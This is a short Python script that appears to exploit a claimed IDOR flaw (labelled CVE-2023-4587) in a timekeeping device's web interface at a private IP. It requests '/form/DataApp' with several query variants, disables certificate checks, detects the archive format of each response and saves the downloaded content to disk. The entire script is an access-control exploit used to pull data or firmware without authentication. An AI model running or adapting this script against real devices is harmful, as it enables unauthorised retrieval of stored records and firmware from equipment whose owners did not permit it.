import requests
import urllib3
import os
urllib3.disable_warnings()

# Try the CVE endpoint - /form/DataApp?style=1 is the CVE-2023-4587 IDOR
urls = [
    'http://172.16.254.202/form/DataApp?style=1',
    'http://172.16.254.202/form/DataApp?style=0',
    'http://172.16.254.202/form/DataApp',
    'http://172.16.254.202/',
]

OUT_DIR = r'D:\chamcong\zk_fw_attempts\web_downloads'
os.makedirs(OUT_DIR, exist_ok=True)

for url in urls:
    print(f'\n=== {url} ===')
    try:
        r = requests.get(url, timeout=10, verify=False)
        print(f'Status: {r.status_code}')
        print(f'Size: {len(r.content)} bytes')
        print(f'Content-Type: {r.headers.get("Content-Type", "?")}')
        cd = r.headers.get('Content-Disposition', '?')
        print(f'Content-Disposition: {cd}')
        print(f'First 16 bytes hex: {r.content[:16].hex()}')
        # Identify format
        magic = r.content[:4]
        if magic[:2] == b'\x1f\x8b':
            print('  Format: GZIP')
            ext = 'tar.gz'
        elif magic[:2] == b'PK':
            print('  Format: ZIP')
            ext = 'zip'
        elif magic[:3] == b'7z\xbc\xaf':
            print('  Format: 7Z')
            ext = '7z'
        elif magic[:4] == b'ustar':
            print('  Format: TAR')
            ext = 'tar'
        elif magic[:2] == b'BZh':
            print('  Format: BZ2')
            ext = 'bz2'
        else:
            print(f'  Format: Unknown ({magic.hex()})')
            ext = 'bin'

        # Save
        fname = url.replace('http://', '').replace('/', '_').replace('?', '_').replace('=', '_') + '.' + ext
        out = os.path.join(OUT_DIR, fname)
        with open(out, 'wb') as f:
            f.write(r.content)
        print(f'Saved: {out}')

        # If it's text, show first 500 chars
        if 'text' in r.headers.get('Content-Type', '').lower() or r.content[:1] in [b'<', b'{', b'[']:
            print(f'Text preview:')
            print(r.text[:500])

    except Exception as e:
        print(f'Error: {type(e).__name__}: {e}')
